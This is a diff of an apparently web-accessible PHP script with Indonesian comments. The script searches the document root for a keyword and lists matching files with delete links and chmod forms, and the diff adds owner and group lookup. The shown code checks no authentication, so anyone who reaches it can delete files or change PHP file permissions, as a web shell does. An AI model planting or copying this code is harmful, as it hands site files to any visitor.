@@ -31,6 +31,13 @@ function cariKataDalamFile($kata, $direktori) {
     return $result;
 }
 
+function getInfoPemilik($path) {
+    $owner = posix_getpwuid(fileowner($path))['name'];
+    $group = posix_getgrgid(filegroup($path))['name'];
+
+    return array('owner' => $owner, 'group' => $group);
+}
+
 if (isset($_GET['find']) && !empty($_GET['find'])) {
     $kataCari = $_GET['find'];
     $documentRoot = $_SERVER['DOCUMENT_ROOT']; // Ambil direktori root dari server
@@ -54,7 +61,7 @@ if (isset($_GET['find']) && !empty($_GET['find'])) {
         if (file_exists($fileToChmod) && is_file($fileToChmod) && pathinfo($fileToChmod, PATHINFO_EXTENSION) === 'php') {
             $newPermissions = octdec($_GET['permissions']);
             if (chmod($fileToChmod, $newPermissions)) {
-                echo "Permissions for '$fileToChmod' have been changed to <span style='color: white;'>$newPermissions</span>.";
+                echo "Permissions for '$fileToChmod' have been changed to $newPermissions.";
             } else {
                 echo "Failed to change permissions for '$fileToChmod'.";
             }
@@ -71,17 +78,24 @@ if (isset($_GET['find']) && !empty($_GET['find'])) {
             $file = $fileInfo['path'];
             $permissions = $fileInfo['permissions'];
 
+            // Dapatkan informasi pemilik dan grup
+            $infoPemilik = getInfoPemilik($file);
+            $owner = $infoPemilik['owner'];
+            $group = $infoPemilik['group'];
+
             $deleteUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&delete=" . urlencode($file);
             $chmodUrl = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}&chmod=" . urlencode($file);
 
-            echo "$file (Permissions: ";
-            // Tambahkan warna putih untuk root dan hijau untuk user pada angka izin
-            echo "<span style='color: white;'>" . substr($permissions, 0, 1) . "</span>";
-            echo "<span style='color: green;'>" . substr($permissions, 1) . "</span>) ";
-            
+            echo "$file (Owner: $owner, Group: $group, Permissions: ";
+            // Warna hijau untuk user dan hitam untuk root
+            if ($owner === 'root') {
+                echo "<span style='color: black;'>$permissions</span>) ";
+            } else {
+                echo "<span style='color: green;'>$permissions</span>) ";
+            }
+
             // Tambahkan tautan untuk menghapus file yang sesuai
             echo "<a href='$deleteUrl'>Hapus</a> ";
-            
             // Tambahkan form untuk mengubah izin file
             echo "<form method='post' action='$chmodUrl'>";
             echo "Ubah Permissions: <input type='text' name='permissions' placeholder='e.g., 0755' required> ";
